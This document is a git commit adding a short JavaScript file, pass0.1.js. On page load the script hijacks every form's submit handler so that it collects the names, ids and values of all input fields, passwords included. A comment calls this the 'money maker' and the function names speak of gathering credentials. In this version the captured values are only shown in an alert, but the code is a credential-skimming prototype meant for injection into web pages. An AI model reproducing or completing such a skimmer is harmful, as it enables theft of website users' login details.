0935994acd80914b3491048588545d4f969cf2b8
ozvi <ozvi.inc@gmail.com>
2014-10-29 04:58:19 +0200

    Create pass0.1.js

---
+++ pass0.1.js
@@ -0,0 +1,21 @@
+var lengthOfForm = document.getElementsByTagName("FORM");
+var formNumOfInputs = document.getElementsByTagName("INPUT");
+
+function gatehrCradentials() {
+
+	for(i=0;i<formNumOfInputs.length;i++){
+		var cerdentialN = document.getElementsByTagName("INPUT")[i].name;
+		var cerdentialV = document.getElementsByTagName("INPUT")[i].value;
+		var cerdentialID = document.getElementsByTagName("INPUT")[i].id;
+			alert("inputname: " + cerdentialN +" input id: "+cerdentialID+ " input value: "+cerdentialV);
+	}
+}
+
+function injectJsCrad(){
+for(i=0;i<lengthOfForm.length;i++){
+var formCounter = document.getElementsByTagName("FORM")[i];
+formCounter.setAttribute("onsubmit", "gatehrCradentials()"); //money maker
+formCounter.className += " " + "gatehrC"+i //give special class to all the forms, so i can count them
+}
+}
+window.onload = injectJsCrad;
